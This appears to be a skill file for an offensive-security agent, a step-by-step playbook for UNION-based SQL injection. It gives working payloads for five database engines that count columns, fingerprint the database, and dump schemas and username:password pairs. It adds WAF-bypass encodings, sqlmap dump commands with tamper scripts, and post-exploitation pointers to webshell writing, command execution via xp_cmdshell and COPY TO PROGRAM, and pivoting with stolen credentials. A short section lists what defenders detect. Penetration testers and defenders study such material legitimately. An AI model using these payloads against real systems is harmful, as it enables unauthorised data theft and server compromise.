---
name: sql-injection-union
description: "Extract data via UNION-based SQL injection across MySQL, MSSQL, PostgreSQL, Oracle, and SQLite"
category: web
tools: [sqlmap, burpsuite]
opsec: medium
references:
  - source: public-security-references
    path: SQL Injection/MySQL Injection.md
  - source: public-security-references
    path: SQL Injection/MSSQL Injection.md
  - source: public-security-references
    path: SQL Injection/PostgreSQL Injection.md
  - source: public-security-references
    path: SQL Injection/OracleSQL Injection.md
  - source: public-security-references
    path: SQL Injection/SQLite Injection.md
  - source: public-security-references
    path: src/pentesting-web/sql-injection/README.md
---

# SQL Injection — Union-Based

<skill-name>sql-injection-union</skill-name>

Extract data directly in the HTTP response by appending a `UNION SELECT` to the vulnerable query. Requires that query results are rendered in the page and you can determine the column count. This is the fastest SQLi extraction technique when it works.

## Prerequisites

- Confirmed SQL injection point (see **web-vuln-discovery**)
- Query output rendered somewhere in the response
- UNION keyword not blocked by WAF (if blocked, try **sql-injection-error** or **sql-injection-blind**)

## Enumeration

### Step 1: Determine Column Count

Two methods — try both, use whichever succeeds.

**ORDER BY method** — increment until error:
```
' ORDER BY 1--+        (OK)
' ORDER BY 2--+        (OK)
' ORDER BY 3--+        (OK)
' ORDER BY 4--+        (ERROR → 3 columns)
```

**UNION SELECT NULL method** — increment NULLs until no error:
```
' UNION SELECT NULL--+                 (ERROR)
' UNION SELECT NULL,NULL--+            (ERROR)
' UNION SELECT NULL,NULL,NULL--+       (OK → 3 columns)
```

### Step 2: Find Displayed Columns

Replace NULLs one at a time with a visible marker to find which column positions render in the page:

```
' UNION SELECT 'AAA',NULL,NULL--+
' UNION SELECT NULL,'BBB',NULL--+
' UNION SELECT NULL,NULL,'CCC'--+
```

Look for `AAA`, `BBB`, or `CCC` in the response. The column(s) that appear are your extraction points.

### Step 3: Identify the DBMS

If not already known from error messages, use tautology payloads in a displayed column:

```sql
-- MySQL
' UNION SELECT version(),NULL,NULL--+
-- PostgreSQL
' UNION SELECT version(),NULL,NULL--+
-- MSSQL
' UNION SELECT @@version,NULL,NULL--+
-- Oracle (requires FROM dual)
' UNION SELECT banner,NULL,NULL FROM v$version WHERE ROWNUM=1--+
-- SQLite
' UNION SELECT sqlite_version(),NULL,NULL--+
```

## Exploitation

Once you know the column count, displayed column position, and DBMS, extract data.

### MySQL

```sql
-- Current user and database
' UNION SELECT user(),database(),NULL--+

-- List all databases
' UNION SELECT GROUP_CONCAT(schema_name),NULL,NULL FROM information_schema.schemata--+

-- List tables in target database
' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema='TARGET_DB'--+

-- List columns in target table
' UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='TARGET_TABLE'--+

-- Extract data
' UNION SELECT GROUP_CONCAT(username,0x3a,password),NULL,NULL FROM TARGET_DB.TARGET_TABLE--+
```

**Dump In One Shot (DIOS)** — extract all tables and columns in a single query:
```sql
' UNION SELECT CONCAT(
  '~',
  (SELECT GROUP_CONCAT(table_name,0x3a,column_name SEPARATOR 0x0a)
   FROM information_schema.columns
   WHERE table_schema=database())
),NULL,NULL--+
```

**Without information_schema** (when blocked by WAF):
```sql
-- Use mysql.innodb_table_stats (MySQL 5.6+)
' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM mysql.innodb_table_stats WHERE database_name=database()--+
```

### MSSQL

```sql
-- Current user and database
' UNION SELECT SYSTEM_USER,DB_NAME(),NULL--+

-- List all databases
' UNION SELECT STRING_AGG(name,','),NULL,NULL FROM master..sysdatabases--+

-- List tables in current database
' UNION SELECT STRING_AGG(name,','),NULL,NULL FROM sysobjects WHERE xtype='U'--+

-- List columns in target table
' UNION SELECT STRING_AGG(name,','),NULL,NULL FROM syscolumns WHERE id=OBJECT_ID('TARGET_TABLE')--+

-- Extract data
' UNION SELECT STRING_AGG(username+':'+password,','),NULL,NULL FROM TARGET_TABLE--+

-- FOR JSON extraction (concise, returns full table as JSON)
' UNION SELECT (SELECT * FROM TARGET_TABLE FOR JSON AUTO),NULL,NULL--+
```

**Iterate databases** when STRING_AGG unavailable (older MSSQL):
```sql
-- DB_NAME(N) returns the Nth database
' UNION SELECT DB_NAME(0),NULL,NULL--+
' UNION SELECT DB_NAME(1),NULL,NULL--+
' UNION SELECT DB_NAME(2),NULL,NULL--+
```

### PostgreSQL

```sql
-- Current user and database
' UNION SELECT current_user,current_database(),NULL--+

-- List all databases
' UNION SELECT STRING_AGG(datname,','),NULL,NULL FROM pg_database--+

-- List tables in public schema
' UNION SELECT STRING_AGG(tablename,','),NULL,NULL FROM pg_tables WHERE schemaname='public'--+

-- List columns in target table
' UNION SELECT STRING_AGG(column_name,','),NULL,NULL FROM information_schema.columns WHERE table_name='TARGET_TABLE'--+

-- Extract data
' UNION SELECT STRING_AGG(username||':'||password,','),NULL,NULL FROM TARGET_TABLE--+

-- XML helper — dump entire table in one query
' UNION SELECT query_to_xml('SELECT * FROM TARGET_TABLE',true,false,'')::text,NULL,NULL--+

-- Dump entire database schema
' UNION SELECT database_to_xmlschema(current_database(),true,false,'')::text,NULL,NULL--+
```

### Oracle

Oracle requires `FROM dual` for every SELECT without a table, and does not support `LIMIT` — use `ROWNUM` instead.

```sql
-- Current user and database
' UNION SELECT user,global_name,NULL FROM global_name--+

-- List all tables owned by current user
' UNION SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name),NULL,NULL FROM user_tables--+

-- List all accessible tables
' UNION SELECT LISTAGG(owner||'.'||table_name,',') WITHIN GROUP (ORDER BY owner),NULL,NULL FROM all_tables WHERE ROWNUM<=50--+

-- List columns in target table
' UNION SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_id),NULL,NULL FROM all_tab_columns WHERE table_name='TARGET_TABLE'--+

-- Extract data
' UNION SELECT LISTAGG(username||':'||password,',') WITHIN GROUP (ORDER BY username),NULL,NULL FROM TARGET_TABLE--+
```

**Without LISTAGG** (Oracle < 11.2):
```sql
-- Use XMLAGG for string aggregation
' UNION SELECT RTRIM(XMLAGG(XMLELEMENT(e,table_name||',').EXTRACT('//text()') ORDER BY table_name).GetClobVal(),','),NULL,NULL FROM user_tables--+
```

### SQLite

```sql
-- SQLite version
' UNION SELECT sqlite_version(),NULL,NULL--+

-- List all tables
' UNION SELECT GROUP_CONCAT(tbl_name),NULL,NULL FROM sqlite_master WHERE type='table'--+

-- List columns in target table (uses pragma)
' UNION SELECT GROUP_CONCAT(name),NULL,NULL FROM pragma_table_info('TARGET_TABLE')--+

-- Extract data
' UNION SELECT GROUP_CONCAT(username||':'||password),NULL,NULL FROM TARGET_TABLE--+
```

## Post-Exploitation

After extracting credentials or sensitive data:

1. **Check for file read privileges** — see if you can read server files (MySQL `LOAD_FILE()`, MSSQL `OPENROWSET BULK`, PostgreSQL `pg_read_file()`)
2. **Check for write privileges** — write a webshell (MySQL `INTO OUTFILE`, SQLite `ATTACH DATABASE`)
3. **Check for command execution** — MSSQL `xp_cmdshell`, PostgreSQL `COPY TO PROGRAM`, Oracle Java execution
4. **Pivot** — use extracted credentials against other services (SSH, RDP, admin panels)

## Cleanup

- UNION SELECT is read-only — no artifacts to clean up on the database side
- Clear your proxy history of any extracted sensitive data after documenting findings
- If you wrote files (webshells), remove them after use

## Detection

Defenders look for:
- `UNION` keyword in query parameters or POST bodies
- `information_schema` references in web logs
- `GROUP_CONCAT`, `STRING_AGG`, `LISTAGG` in query strings
- Anomalous response sizes (large data dumps)

## Troubleshooting

### UNION Blocked by WAF

```sql
-- Case variations
' UnIoN SeLeCt NULL,NULL,NULL--+

-- Inline comments (MySQL)
' /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL,NULL--+

-- Double URL encoding
%252f%252a*/UNION%252f%252a*/SELECT

-- Using UNION ALL instead of UNION
' UNION ALL SELECT NULL,NULL,NULL--+
```

### Column Type Mismatch

If `UNION SELECT 'string',NULL,NULL` fails, the column might be numeric:
```sql
-- Try integers instead of strings
' UNION SELECT 1,2,3--+

-- Cast explicitly
' UNION SELECT CAST(user() AS UNSIGNED),NULL,NULL--+
```

### No Visible Output

If the query executes but data doesn't appear in the response, the column may not be rendered. Try:
- Different column positions
- Wrapping in an HTML comment: `' UNION SELECT CONCAT('<!--',user(),'-->'),NULL,NULL--+`
- Switch to **sql-injection-error** (error-based extraction) or **sql-injection-blind**

### Automated Extraction with sqlmap

```bash
# Basic test and extraction
sqlmap -u "https://TARGET/page?id=1" --batch --dbs

# Specify injection point with *
sqlmap -u "https://TARGET/page?id=1*" --batch --technique=U --dbs

# From a saved Burp request file
sqlmap -r request.txt --batch --technique=U --dbs

# Dump specific table
sqlmap -r request.txt --batch -D TARGET_DB -T TARGET_TABLE --dump

# With tamper scripts for WAF bypass
sqlmap -r request.txt --batch --tamper=space2comment,between --technique=U --dbs
```
